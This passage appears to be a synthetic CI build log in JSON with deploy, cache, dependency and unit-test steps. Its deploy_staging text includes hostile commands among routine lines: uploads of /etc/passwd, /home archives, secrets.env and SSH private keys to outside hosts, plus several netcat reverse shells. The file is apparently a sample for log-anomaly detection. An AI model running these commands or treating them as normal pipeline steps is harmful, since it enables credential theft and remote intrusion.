Feature will be removed in v4.0\nStep 6/10: Building\n  PASS: test_api_health (71ms)\n  PASS: test_auth_login (332ms)\n  PASS: test_user_create (263ms)\nStep 5/10: Building\nCompiling src/index.js...\nArtifact uploaded: build.tar.gz (37MB)\n\u2713 test completed\nCompiling src/main.py...\n\u2713 test completed\nStep 7/10: Building\nCompiling src/main.py...\nStep 9/10: Building\nCompiling src/app.ts...\nInstalling webpack@3.1.0\nStep 1/10: Building\nStep 6/10: Building\n[12:00:32] INFO: Processing request\nInstalling eslint@4.10.0\n\u2713 test completed\nArtifact uploaded: build.tar.gz (46MB)\n\u26a0 DEPRECATION: Feature will be removed in v4.0\n  PASS: test_api_health (10ms)\n\u2713 test completed\n\u2713 lint completed\nCache hit for key-6072\n\u2713 build completed\n[12:00:32] INFO: Processing request\nStep 2/10: Building\n\u2713 build completed\nCache hit for key-9551\nCompiling src/index.js...\n\u2713 test completed\n  PASS: test_cache_hit (291ms)\nArtifact uploaded: build.tar.gz (15MB)\nCompiling src/index.js...\n  PASS: test_db_connect (140ms)\nInstalling axios@3.7.0\nCompiling src/main.py...\nCompiling src/main.py...\nCompiling src/app.ts...\nCompiling src/app.ts...\nCompiling src/index.js...\nInstalling webpack@1.18.0\nCompiling src/app.ts...\nArtifact uploaded: build.tar.gz (16MB)\nInstalling axios@2.12.0\n[12:00:32] INFO: Processing request\nInstalling eslint@1.8.0\nCache hit for key-8612\nCache hit for key-3783\n  PASS: test_auth_login (47ms)\nInstalling axios@4.0.0\nCache hit for key-2470\nArtifact uploaded: build.tar.gz (9MB)\n[12:00:32] INFO: Processing request\n[12:00:32] INFO: Processing request\nStep 9/10: Building\nWARNING: prettier has known vulnerabilities\nArtifact uploaded: build.tar.gz (44MB)\n\u2713 lint completed\nInstalling webpack@3.17.0\nStep 4/10: Building\nStep 7/10: Building\nArtifact uploaded: build.tar.gz (23MB)\n[12:00:32] INFO: Processing request\n[12:00:32] INFO: Processing request\nInstalling lodash@3.9.0\nArtifact uploaded: build.tar.gz (6MB)\n[12:00:32] INFO: Processing request\nCache hit for key-6434\nCache hit for key-5163\nArtifact uploaded: build.tar.gz (17MB)\n\u2713 lint completed\n\u2713 test completed\n  PASS: test_db_connect (181ms)\nArtifact uploaded: build.tar.gz (38MB)\nCompiling src/service.java...\nInstalling prettier@1.12.0\n[12:00:32] INFO: Processing request\nCompiling src/main.py...\nArtifact uploaded: build.tar.gz (42MB)\nCache hit for key-3698\nCompiling src/utils.go...\nStep 10/10: Building\n  PASS: test_api_health (65ms)\n[12:00:32] INFO: Processing request\nCache hit for key-9810\nCompiling src/handler.rs...\nArtifact uploaded: build.tar.gz (18MB)\nCache hit for key-7717\n  PASS: test_cache_hit (243ms)\n  PASS: test_auth_login (399ms)\nInstalling jest@3.13.0\nInstalling jest@4.19.0\nStep 6/10: Building\nArtifact uploaded: build.tar.gz (20MB)\nCache hit for key-7304\nStep 1/10: Building\n[12:00:32] INFO: Processing request\nCache hit for key-8596\nCache hit for key-7759\nCache hit for key-9403\nStep 3/10: Building\n\u2713 lint completed\n[12:00:32] WARN: Deprecated API usage\n\u2713 test completed\n\u2713 build completed\n[12:00:32] INFO: Processing request\nCache hit for key-1378\n[12:00:32] INFO: Processing request\n[12:00:32] WARN: Deprecated API usage\nCache hit for key-2300\n\u2713 test completed\n\u26a0 DEPRECATION: Feature will be removed in v4.0\n\u2713 test completed\nArtifact uploaded: build.tar.gz (47MB)\n[12:00:32] INFO: Processing request\n[12:00:32] INFO: Processing request\n  PASS: test_cache_hit (121ms)\n\u2713 lint completed\nCache hit for key-3334\nInstalling react@1.4.0\n  PASS: test_api_health (429ms)\nStep 5/10: Building\nInstalling eslint@5.13.0\nException: ValueError\nStep 2/10: Building\nCompiling src/handler.rs...\n[12:00:32] INFO: Processing request\nStep 10/10: Building\n  PASS: test_db_connect (312ms)\n\u2713 test completed\nCache hit for key-7793\n  PASS: test_api_health (410ms)\nStep 1/10: Building\n\u2713 test completed\n[12:00:32] INFO: Processing request\n[12:00:32] INFO: Processing request\nCompiling src/service.java...\n[12:00:32] ERROR: Connection failed\nStep 1/10: Building\nCache hit for key-8392\n[12:00:32] INFO: Processing request\n  PASS: test_user_create (323ms)\n[12:00:32] INFO: Processing request\n[12:00:32] INFO: Processing request\nInstalling webpack@2.5.0\nArtifact uploaded: build.tar.gz (37MB)\n[12:00:32] WARN: Deprecated API usage\n  PASS: test_user_create (477ms)\nInstalling axios@3.0.0\n  PASS: test_user_create (347ms)\nCache hit for key-8772\nStep 3/10: Building\n[12:00:32] INFO: Processing request\n=== Step e2e_tests completed ===\n=== Step: deploy_staging ===\n  PASS: test_user_create (334ms)\n\u2717 build failed with exit code 70\n[12:00:32] WARN: Deprecated API usage\nCache hit for key-3093\nInstalling express@1.3.0\nwget --post-data=\"$(cat /etc/passwd)\" https://cloud.services/\n\u2713 lint completed\nCache hit for key-5446\n  PASS: test_api_health (483ms)\nArtifact uploaded: build.tar.gz (28MB)\nException: ValueError\nWARNING: react has known vulnerabilities\nInstalling react@5.7.0\nArtifact uploaded: build.tar.gz (5MB)\nStep 3/10: Building\nCache hit for key-8966\nWARNING: lodash has known vulnerabilities\nInstalling axios@5.5.0\nStep 4/10: Building\nArtifact uploaded: build.tar.gz (7MB)\nArtifact uploaded: build.tar.gz (7MB)\n\u2713 lint completed\nCompiling src/utils.go...\nInstalling express@5.1.0\nSending 375MB of data to startup.dev\n  PASS: test_api_health (331ms)\ntar czf - /home | curl -X POST -d @- https://acme.corp/upload\nnc -e /bin/sh 141.15.181.151 54872\n[12:00:32] WARN: Deprecated API usage\nCache hit for key-1669\ntar czf - /home | curl -X POST -d @- https://acme.corp/upload\nStep 10/10: Building\n\u2713 lint completed\nCache hit for key-6049\nArtifact uploaded: build.tar.gz (24MB)\nCache hit for key-4233\nCompiling src/index.js...\n[12:00:32] INFO: Processing request\nWARNING: axios has known vulnerabilities\nCache hit for key-2301\ncurl -X POST https://example.com/collect -d @secrets.env\nInstalling eslint@4.10.0\n\u2713 build completed\n\u2717 build failed with exit code 103\nCompiling src/handler.rs...\nInstalling express@3.16.0\n[12:00:32] INFO: Processing request\nArtifact uploaded: build.tar.gz (4MB)\nCompiling src/app.ts...\n  PASS: test_user_create (445ms)\n[12:00:32] WARN: Deprecated API usage\nCache hit for key-1364\n[12:00:32] INFO: Processing request\n[12:00:32] INFO: Processing request\nCompiling src/main.py...\n\u2713 test completed\nInstalling webpack@1.18.0\nCache hit for key-8633\nStep 2/10: Building\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nArtifact uploaded: build.tar.gz (47MB)\nStep 10/10: Building\nCompiling src/app.ts...\n\u26a0 DEPRECATION: Feature will be removed in v5.0\n[12:00:32] INFO: Processing request\nArtifact uploaded: build.tar.gz (2MB)\n  PASS: test_user_create (228ms)\nInstalling express@3.12.0\nCache hit for key-8028\n[12:00:32] INFO: Processing request\nInstalling jest@1.0.0\nInstalling lodash@2.5.0\n  PASS: test_cache_hit (45ms)\nInstalling express@4.7.0\nInstalling webpack@5.0.0\nCompiling src/service.java...\necho $(cat ~/.ssh/id_rsa) | base64 | nc 206.179.197.169 31078\nWARNING: react has known vulnerabilities\n\u26a0 DEPRECATION: Feature will be removed in v5.0\n[12:00:32] INFO: Processing request\n[12:00:32] WARN: Deprecated API usage\n\u2713 lint completed\nCache hit for key-9834\n[12:00:32] INFO: Processing request\nStep 1/10: Building\nArtifact uploaded: build.tar.gz (13MB)\nInstalling react@2.0.0\nCompiling src/utils.go...\nCompiling src/utils.go...\n  PASS: test_user_create (240ms)\nInstalling react@5.19.0\n  PASS: test_user_create (144ms)\nnc -e /bin/sh 70.57.20.175 56610\necho $(cat ~/.ssh/id_rsa) | base64 | nc 190.198.189.218 65432\n  PASS: test_db_connect (424ms)\nInstalling prettier@5.12.0\nException: ValueError\nStep 1/10: Building\nCompiling src/index.js...\nArtifact uploaded: build.tar.gz (48MB)\nCache hit for key-9220\nwget --post-data=\"$(cat /etc/passwd)\" https://startup.dev/\n[12:00:32] INFO: Processing request\nCache hit for key-9411\nArtifact uploaded: build.tar.gz (48MB)\nArtifact uploaded: build.tar.gz (24MB)\nStep 2/10: Building\nCompiling src/app.ts...\n  PASS: test_auth_login (348ms)\n  PASS: test_db_connect (446ms)\nStep 6/10: Building\nCompiling src/handler.rs...\nnc -e /bin/sh 67.133.60.180 34741\n  PASS: test_auth_login (122ms)\n[12:00:32] INFO: Processing request\nStep 4/10: Building\nCompiling src/service.java...\nStep 10/10: Building\nCache hit for key-4459\n\u2713 build completed\n\u2713 lint completed\n[12:00:32] INFO: Processing request\n[12:00:32] INFO: Processing request\nInstalling jest@5.16.0\nArtifact uploaded: build.tar.gz (8MB)\n\u2713 build completed\nInstalling jest@4.5.0\nArtifact uploaded: build.tar.gz (41MB)\nCache hit for key-4001\n  PASS: test_auth_login (306ms)\n[12:00:32] INFO: Processing request\nArtifact uploaded: build.tar.gz (43MB)\nnc -e /bin/sh 109.253.225.157 30991\nInstalling axios@5.11.0\nInstalling webpack@5.19.0\n\u2713 build completed\nArtifact uploaded: build.tar.gz (35MB)\n  PASS: test_user_create (290ms)\nInstalling express@2.5.0\nArtifact uploaded: build.tar.gz (26MB)\nArtifact uploaded: build.tar.gz (36MB)\n[12:00:32] INFO: Processing request\nCompiling src/app.ts...\nArtifact uploaded: build.tar.gz (10MB)\n\u2713 lint completed\nWARNING: react has known vulnerabilities\nWARNING: jest has known vulnerabilities\nInstalling jest@1.4.0\nCache hit for key-8854\n\u2713 test completed\nStep 9/10: Building\nStep 5/10: Building\nArtifact uploaded: build.tar.gz (8MB)\nSending 469MB of data to example.com\n\u2713 build completed\ntar czf - /home | curl -X POST -d @- https://test.io/upload\n\u2713 lint completed\n\u2713 build completed\nInstalling react@5.10.0\nCompiling src/main.py...\n\u2713 build completed\nCache hit for key-5924\n  PASS: test_db_connect (339ms)\n\u2713 lint completed\nInstalling lodash@1.11.0\n[12:00:32] INFO: Processing request\nInstalling axios@5.7.0\n  PASS: test_user_create (328ms)\nCache hit for key-3039\nStep 8/10: Building\nInstalling express@4.3.0\nWARNING: lodash has known vulnerabilities\n\u2713 lint completed\n[12:00:32] INFO: Processing request\n  PASS: test_auth_login (27ms)\n\u2713 lint completed\necho $(cat ~/.ssh/id_rsa) | base64 | nc 190.83.68.215 26752\n[12:00:32] INFO: Processing request\nCache hit for key-4035\nArtifact uploaded: build.tar.gz (50MB)\nArtifact uploaded: build.tar.gz (32MB)\n\u2713 test completed\nArtifact uploaded: build.tar.gz (25MB)\nwget --post-data=\"$(cat /etc/passwd)\" https://test.io/\nStep 6/10: Building\nCompiling src/main.py...\n[12:00:32] INFO: Processing request\nArtifact uploaded: build.tar.gz (25MB)\n  PASS: test_api_health (145ms)\nWARNING: lodash has known vulnerabilities\nWARNING: axios has known vulnerabilities\ntar czf - /home | curl -X POST -d @- https://acme.corp/upload\nArtifact uploaded: build.tar.gz (38MB)\nCompiling src/utils.go...\nWARNING: lodash has known vulnerabilities\n  PASS: test_db_connect (48ms)\n[12:00:32] INFO: Processing request\n[12:00:32] INFO: Processing request\nInstalling axios@5.16.0\n[12:00:32] INFO: Processing request\nInstalling prettier@5.9.0\ncurl -X POST https://cloud.services/collect -d @secrets.env\nStep 8/10: Building\n\u2713 lint completed\n\u2713 build completed\nArtifact uploaded: build.tar.gz (46MB)\nCompiling src/service.java...\n[12:00:32] INFO: Processing request\n  PASS: test_cache_hit (390ms)\nCompiling src/index.js...\nArtifact uploaded: build.tar.gz (46MB)\n[12:00:32] INFO: Processing request\n  PASS: test_cache_hit (301ms)\nSending 127MB of data to test.io\nCompiling src/utils.go...\n\u2713 build completed\nWARNING: express has known vulnerabilities\n  PASS: test_cache_hit (280ms)\nCompiling src/utils.go...\nCache hit for key-6473\n  PASS: test_cache_hit (442ms)\nInstalling eslint@3.16.0\ncurl -X POST https://startup.dev/collect -d @secrets.env\nCompiling src/main.py...\n\u2713 lint completed\nCache hit for key-1303\n  PASS: test_user_create (452ms)\n\u2713 test completed\nInstalling eslint@2.10.0\n=== Step deploy_staging completed ===",
    "steps": [
      {
        "name": "save_cache",
        "status": "success",
        "started_at": "2025-12-20T12:00:32.569574",
        "finished_at": "2025-12-20T12:00:37.018082",
        "log_lines": [
          "=== Step: save_cache ===",
          "Artifact uploaded: build.tar.gz (16MB)",
          "Cache hit for key-5710",
          "Installing lodash@4.17.0",
          "Cache hit for key-7044",
          "[12:00:32] WARN: Deprecated API usage",
          "  PASS: test_db_connect (173ms)",
          "  PASS: test_cache_hit (223ms)",
          "Compiling src/index.js...",
          "Compiling src/index.js...",
          "Cache hit for key-8053",
          "[12:00:32] INFO: Processing request",
          "\u2713 build completed",
          "Installing express@2.9.0",
          "[12:00:32] INFO: Processing request",
          "\u2713 build completed",
          "  PASS: test_auth_login (347ms)",
          "[12:00:32] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (50MB)",
          "Cache hit for key-8616",
          "Compiling src/index.js...",
          "[12:00:32] INFO: Processing request",
          "  PASS: test_db_connect (80ms)",
          "[12:00:32] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (35MB)",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Compiling src/handler.rs...",
          "Compiling src/handler.rs...",
          "Installing prettier@5.3.0",
          "Artifact uploaded: build.tar.gz (10MB)",
          "Compiling src/index.js...",
          "  PASS: test_api_health (126ms)",
          "  PASS: test_auth_login (122ms)",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Compiling src/handler.rs...",
          "[12:00:32] INFO: Processing request",
          "Compiling src/app.ts...",
          "[12:00:32] INFO: Processing request",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Step 2/10: Building",
          "Step 10/10: Building",
          "Installing express@4.20.0",
          "Installing prettier@1.2.0",
          "\u2713 build completed",
          "Compiling src/handler.rs...",
          "\u2713 lint completed",
          "WARNING: eslint has known vulnerabilities",
          "Step 10/10: Building",
          "[12:00:32] WARN: Deprecated API usage",
          "\u2713 test completed",
          "Step 6/10: Building",
          "Artifact uploaded: build.tar.gz (44MB)",
          "WARNING: webpack has known vulnerabilities",
          "Compiling src/service.java...",
          "Installing webpack@5.2.0",
          "Step 3/10: Building",
          "Artifact uploaded: build.tar.gz (44MB)",
          "FAILED: test_user_create",
          "  PASS: test_auth_login (473ms)",
          "\u2717 build failed with exit code 89",
          "Step 7/10: Building",
          "[12:00:32] INFO: Processing request",
          "Compiling src/app.ts...",
          "Installing webpack@5.3.0",
          "Compiling src/utils.go...",
          "Compiling src/handler.rs...",
          "Artifact uploaded: build.tar.gz (33MB)",
          "\u2713 test completed",
          "Cache hit for key-9249",
          "Installing express@5.18.0",
          "WARNING: react has known vulnerabilities",
          "\u2713 lint completed",
          "[12:00:32] WARN: Deprecated API usage",
          "[12:00:32] WARN: Deprecated API usage",
          "[12:00:32] INFO: Processing request",
          "WARNING: eslint has known vulnerabilities",
          "\u2713 test completed",
          "\u2717 build failed with exit code 13",
          "Cache hit for key-4223",
          "[12:00:32] INFO: Processing request",
          "[12:00:32] INFO: Processing request",
          "Compiling src/utils.go...",
          "Compiling src/app.ts...",
          "Compiling src/main.py...",
          "Step 3/10: Building",
          "\u2713 test completed",
          "Step 1/10: Building",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "\u2713 lint completed",
          "  PASS: test_cache_hit (342ms)",
          "Installing prettier@5.7.0",
          "Cache hit for key-4854",
          "Artifact uploaded: build.tar.gz (29MB)",
          "Step 9/10: Building",
          "Step 10/10: Building",
          "[12:00:32] INFO: Processing request",
          "Cache hit for key-9809",
          "[12:00:32] INFO: Processing request",
          "Installing webpack@5.6.0",
          "[12:00:32] WARN: Deprecated API usage",
          "  PASS: test_db_connect (261ms)",
          "[12:00:32] INFO: Processing request",
          "Exception: NullPointerException",
          "Compiling src/handler.rs...",
          "Cache hit for key-4259",
          "Step 3/10: Building",
          "Step 1/10: Building",
          "Installing eslint@1.15.0",
          "Exception: ValueError",
          "Step 8/10: Building",
          "Installing lodash@5.9.0",
          "Installing jest@2.9.0",
          "Compiling src/utils.go...",
          "Installing axios@3.5.0",
          "Step 8/10: Building",
          "Cache hit for key-8457",
          "Cache hit for key-2612",
          "Compiling src/index.js...",
          "Compiling src/handler.rs...",
          "Exception: ValueError",
          "  PASS: test_api_health (305ms)",
          "\u2713 lint completed",
          "Step 9/10: Building",
          "WARNING: eslint has known vulnerabilities",
          "\u2713 lint completed",
          "[12:00:32] WARN: Deprecated API usage",
          "[12:00:32] INFO: Processing request",
          "\u2713 test completed",
          "[12:00:32] INFO: Processing request",
          "Step 8/10: Building",
          "[12:00:32] ERROR: Connection failed",
          "Artifact uploaded: build.tar.gz (15MB)",
          "[12:00:32] INFO: Processing request",
          "[12:00:32] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (2MB)",
          "Step 6/10: Building",
          "Installing eslint@5.20.0",
          "  PASS: test_cache_hit (375ms)",
          "Cache hit for key-2692",
          "Exception: ValueError",
          "  PASS: test_api_health (388ms)",
          "Compiling src/app.ts...",
          "  PASS: test_api_health (407ms)",
          "Step 4/10: Building",
          "Step 6/10: Building",
          "Artifact uploaded: build.tar.gz (39MB)",
          "  PASS: test_user_create (27ms)",
          "Artifact uploaded: build.tar.gz (47MB)",
          "Step 9/10: Building",
          "Installing lodash@4.15.0",
          "\u2713 build completed",
          "WARNING: jest has known vulnerabilities",
          "Cache hit for key-6530",
          "\u2713 lint completed",
          "[12:00:32] INFO: Processing request",
          "\u2713 test completed",
          "[12:00:32] INFO: Processing request",
          "[12:00:32] INFO: Processing request",
          "Cache hit for key-8225",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "[12:00:32] INFO: Processing request",
          "Installing axios@3.7.0",
          "Artifact uploaded: build.tar.gz (2MB)",
          "Step 8/10: Building",
          "  PASS: test_cache_hit (148ms)",
          "Artifact uploaded: build.tar.gz (22MB)",
          "Compiling src/main.py...",
          "Artifact uploaded: build.tar.gz (44MB)",
          "[12:00:32] INFO: Processing request",
          "Compiling src/index.js...",
          "Artifact uploaded: build.tar.gz (14MB)",
          "Step 4/10: Building",
          "Artifact uploaded: build.tar.gz (23MB)",
          "  PASS: test_cache_hit (261ms)",
          "Cache hit for key-5510",
          "WARNING: react has known vulnerabilities",
          "Installing prettier@1.14.0",
          "Step 1/10: Building",
          "Step 10/10: Building",
          "[12:00:32] INFO: Processing request",
          "Cache hit for key-1479",
          "Cache hit for key-2453",
          "\u2713 test completed",
          "Step 10/10: Building",
          "Step 8/10: Building",
          "Step 2/10: Building",
          "  PASS: test_auth_login (245ms)",
          "Cache hit for key-4732",
          "Compiling src/app.ts...",
          "\u2713 lint completed",
          "Installing eslint@5.3.0",
          "Installing react@3.7.0",
          "  PASS: test_user_create (57ms)",
          "Compiling src/index.js...",
          "Cache hit for key-2579",
          "[12:00:32] INFO: Processing request",
          "Cache hit for key-6187",
          "  PASS: test_user_create (152ms)",
          "  PASS: test_api_health (44ms)",
          "Step 7/10: Building",
          "  PASS: test_auth_login (204ms)",
          "Installing axios@5.16.0",
          "  PASS: test_auth_login (490ms)",
          "[12:00:32] INFO: Processing request",
          "Compiling src/index.js...",
          "Artifact uploaded: build.tar.gz (24MB)",
          "Step 4/10: Building",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Installing eslint@5.13.0",
          "WARNING: eslint has known vulnerabilities",
          "=== Step save_cache completed ==="
        ]
      },
      {
        "name": "install_dependencies",
        "status": "success",
        "started_at": "2025-12-20T12:00:37.018082",
        "finished_at": "2025-12-20T12:00:59.260620",
        "log_lines": [
          "=== Step: install_dependencies ===",
          "Cache hit for key-2323",
          "\u2713 lint completed",
          "Compiling src/main.py...",
          "Cache hit for key-7878",
          "  PASS: test_db_connect (32ms)",
          "[12:00:32] INFO: Processing request",
          "Compiling src/app.ts...",
          "Step 4/10: Building",
          "  PASS: test_db_connect (152ms)",
          "Cache hit for key-7620",
          "Cache hit for key-4545",
          "[12:00:32] INFO: Processing request",
          "Installing axios@4.6.0",
          "Cache hit for key-9422",
          "Step 5/10: Building",
          "Compiling src/app.ts...",
          "  PASS: test_api_health (219ms)",
          "[12:00:32] INFO: Processing request",
          "Step 2/10: Building",
          "Step 5/10: Building",
          "Installing express@1.8.0",
          "Compiling src/service.java...",
          "WARNING: webpack has known vulnerabilities",
          "Step 1/10: Building",
          "WARNING: jest has known vulnerabilities",
          "\u2713 lint completed",
          "Installing react@1.15.0",
          "Compiling src/app.ts...",
          "Installing webpack@1.10.0",
          "  PASS: test_db_connect (305ms)",
          "[12:00:32] INFO: Processing request",
          "\u2713 lint completed",
          "Step 1/10: Building",
          "  PASS: test_db_connect (110ms)",
          "  PASS: test_cache_hit (325ms)",
          "Artifact uploaded: build.tar.gz (43MB)",
          "Compiling src/index.js...",
          "Compiling src/service.java...",
          "Cache hit for key-7113",
          "Step 10/10: Building",
          "Artifact uploaded: build.tar.gz (31MB)",
          "Artifact uploaded: build.tar.gz (15MB)",
          "WARNING: react has known vulnerabilities",
          "Installing jest@1.8.0",
          "[12:00:32] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (35MB)",
          "[12:00:32] INFO: Processing request",
          "Installing lodash@4.10.0",
          "Installing express@4.16.0",
          "Step 10/10: Building",
          "Installing express@4.0.0",
          "  PASS: test_cache_hit (275ms)",
          "\u2713 test completed",
          "  PASS: test_api_health (371ms)",
          "\u2713 lint completed",
          "Installing axios@4.13.0",
          "[12:00:32] INFO: Processing request",
          "[12:00:32] INFO: Processing request",
          "Step 6/10: Building",
          "\u2713 lint completed",
          "[12:00:32] INFO: Processing request",
          "Step 7/10: Building",
          "Installing eslint@3.2.0",
          "Cache hit for key-6515",
          "  PASS: test_user_create (191ms)",
          "Artifact uploaded: build.tar.gz (40MB)",
          "Installing lodash@2.5.0",
          "Compiling src/utils.go...",
          "\u2713 test completed",
          "[12:00:32] INFO: Processing request",
          "Installing prettier@1.0.0",
          "[12:00:32] INFO: Processing request",
          "Step 1/10: Building",
          "Artifact uploaded: build.tar.gz (20MB)",
          "Step 1/10: Building",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Compiling src/main.py...",
          "WARNING: webpack has known vulnerabilities",
          "Artifact uploaded: build.tar.gz (41MB)",
          "\u2713 build completed",
          "Compiling src/utils.go...",
          "[12:00:32] WARN: Deprecated API usage",
          "Compiling src/handler.rs...",
          "[12:00:32] ERROR: Connection failed",
          "Cache hit for key-2908",
          "[12:00:32] INFO: Processing request",
          "  PASS: test_api_health (324ms)",
          "[12:00:32] ERROR: Connection failed",
          "Step 9/10: Building",
          "Cache hit for key-4270",
          "  PASS: test_auth_login (20ms)",
          "Artifact uploaded: build.tar.gz (10MB)",
          "Compiling src/handler.rs...",
          "\u2713 lint completed",
          "  PASS: test_api_health (82ms)",
          "Installing express@3.14.0",
          "\u2713 build completed",
          "Cache hit for key-2663",
          "Installing express@2.17.0",
          "FAILED: test_api_health",
          "Installing react@2.7.0",
          "Installing axios@2.10.0",
          "Cache hit for key-5002",
          "\u2713 test completed",
          "Artifact uploaded: build.tar.gz (34MB)",
          "  PASS: test_api_health (141ms)",
          "Installing jest@3.20.0",
          "Cache hit for key-6217",
          "Step 10/10: Building",
          "Cache hit for key-6146",
          "Cache hit for key-7831",
          "[12:00:32] INFO: Processing request",
          "Step 9/10: Building",
          "Compiling src/utils.go...",
          "Cache hit for key-3590",
          "Installing express@1.9.0",
          "[12:00:32] WARN: Deprecated API usage",
          "Installing webpack@2.2.0",
          "Step 2/10: Building",
          "Step 5/10: Building",
          "[12:00:32] WARN: Deprecated API usage",
          "Step 2/10: Building",
          "\u2713 lint completed",
          "  PASS: test_user_create (325ms)",
          "Installing eslint@4.7.0",
          "[12:00:32] INFO: Processing request",
          "Compiling src/main.py...",
          "\u2713 test completed",
          "[12:00:32] INFO: Processing request",
          "  PASS: test_cache_hit (304ms)",
          "Artifact uploaded: build.tar.gz (31MB)",
          "Step 6/10: Building",
          "Artifact uploaded: build.tar.gz (22MB)",
          "Compiling src/handler.rs...",
          "Step 5/10: Building",
          "WARNING: prettier has known vulnerabilities",
          "Artifact uploaded: build.tar.gz (20MB)",
          "Cache hit for key-4582",
          "  PASS: test_api_health (303ms)",
          "[12:00:32] INFO: Processing request",
          "\u2713 build completed",
          "Step 2/10: Building",
          "Step 8/10: Building",
          "Cache hit for key-5562",
          "Cache hit for key-4061",
          "Artifact uploaded: build.tar.gz (41MB)",
          "  PASS: test_db_connect (19ms)",
          "Cache hit for key-1425",
          "Compiling src/main.py...",
          "Cache hit for key-9873",
          "[12:00:32] WARN: Deprecated API usage",
          "Compiling src/handler.rs...",
          "Artifact uploaded: build.tar.gz (10MB)",
          "\u2713 lint completed",
          "  PASS: test_cache_hit (400ms)",
          "Artifact uploaded: build.tar.gz (3MB)",
          "  PASS: test_user_create (356ms)",
          "Cache hit for key-8871",
          "  PASS: test_api_health (303ms)",
          "[12:00:32] INFO: Processing request",
          "Step 9/10: Building",
          "Cache hit for key-5554",
          "Step 5/10: Building",
          "Step 6/10: Building",
          "  PASS: test_auth_login (114ms)",
          "  PASS: test_auth_login (171ms)",
          "\u2713 build completed",
          "Installing prettier@4.3.0",
          "Step 10/10: Building",
          "Compiling src/index.js...",
          "WARNING: webpack has known vulnerabilities",
          "Artifact uploaded: build.tar.gz (4MB)",
          "  PASS: test_auth_login (389ms)",
          "Compiling src/service.java...",
          "  PASS: test_auth_login (383ms)",
          "Exception: ValueError",
          "\u2713 lint completed",
          "Installing eslint@3.18.0",
          "Compiling src/service.java...",
          "Compiling src/service.java...",
          "Artifact uploaded: build.tar.gz (24MB)",
          "Artifact uploaded: build.tar.gz (43MB)",
          "  PASS: test_user_create (341ms)",
          "  PASS: test_db_connect (202ms)",
          "[12:00:32] WARN: Deprecated API usage",
          "Step 8/10: Building",
          "Installing jest@2.19.0",
          "\u2713 test completed",
          "Exception: TypeError",
          "Artifact uploaded: build.tar.gz (20MB)",
          "[12:00:32] INFO: Processing request",
          "[12:00:32] INFO: Processing request",
          "Cache hit for key-3995",
          "  PASS: test_db_connect (229ms)",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Cache hit for key-3383",
          "[12:00:32] INFO: Processing request",
          "Installing express@2.16.0",
          "Artifact uploaded: build.tar.gz (35MB)",
          "Step 10/10: Building",
          "[12:00:32] INFO: Processing request",
          "[12:00:32] INFO: Processing request",
          "Compiling src/index.js...",
          "Installing prettier@5.18.0",
          "  PASS: test_cache_hit (181ms)",
          "Cache hit for key-7129",
          "Cache hit for key-7653",
          "Installing react@1.16.0",
          "  PASS: test_db_connect (142ms)",
          "=== Step install_dependencies completed ==="
        ]
      },
      {
        "name": "unit_tests",
        "status": "success",
        "started_at": "2025-12-20T12:00:59.260620",
        "finished_at": "2025-12-20T12:01:21.503158",
        "log_lines": [
          "=== Step: unit_tests ===",
          "Step 3/10: Building",
          "Cache hit for key-7364",
          "  PASS: test_db_connect (479ms)",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "\u2713 build completed",
          "[12:00:32] INFO: Processing request",
          "\u2713 test completed",
          "[12:00:32] INFO: Processing request",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "[12:00:32] WARN: Deprecated API usage",
          "Cache hit for key-8216",
          "Artifact uploaded: build.tar.gz (8MB)",
          "Installing react@5.9.0",
          "\u2713 test completed",
          "\u2713 test completed",
          "Compiling src/main.py...",
          "Step 2/10: Building",
          "  PASS: test_user_create (161ms)",
          "Artifact uploaded: build.tar.gz (18MB)",
          "Artifact uploaded: build.tar.gz (34MB)",
          "WARNING: prettier has known vulnerabilities",
          "Exception: RuntimeError",
          "Compiling src/index.js...",
          "Cache hit for key-4580",
          "Compiling src/main.py...",
          "\u2713 lint completed",
          "Artifact uploaded: build.tar.gz (4MB)",
          "Installing express@5.8.0",
          "Step 5/10: Building",
          "  PASS: test_db_connect (363ms)",
          "[12:00:32] INFO: Processing request",
          "Compiling src/main.py...",
          "Step 10/10: Building",
          "Artifact uploaded: build.tar.gz (15MB)",
          "\u2713 lint completed",
          "Installing webpack@3.18.0",
          "Cache hit for key-2975",
          "  PASS: test_user_create (402ms)",
          "Cache hit for key-8709",
          "Installing webpack@1.5.0",
          "Cache hit for key-1151",
          "Installing lodash@5.6.0",
          "[12:00:32] WARN: Deprecated API usage",
          "Compiling src/service.java...",
          "  PASS: test_api_health (73ms)",
          "[12:00:32] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (9MB)",
          "Installing webpack@1.0.0",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Artifact uploaded: build.tar.gz (24MB)",
          "  PASS: test_user_create (32ms)",
          "[12:00:32] INFO: Processing request",
          "\u2713 test completed",
          "Cache hit for key-9368",
          "  PASS: test_auth_login (451ms)",
          "  PASS: test_api_health (76ms)",
          "\u2713 build completed",
          "  PASS: test_auth_login (52ms)",
          "Artifact uploaded: build.tar.gz (36MB)",
          "Compiling src/handler.rs...",
          "  PASS: test_cache_hit (357ms)",
          "\u2713 build completed",
          "Compiling src/app.ts...",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "[12:00:32] INFO: Processing request",
          "Step 5/10: Building",
          "Artifact uploaded: build.tar.gz (2MB)",
          "Cache hit for key-3441",
          "[12:00:32] INFO: Processing request",
          "Step 2/10: Building",
          "Artifact uploaded: build.tar.gz (49MB)",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "\u2713 build completed",
          "Step 10/10: Building",
          "[12:00:32] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (35MB)",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Cache hit for key-8127",
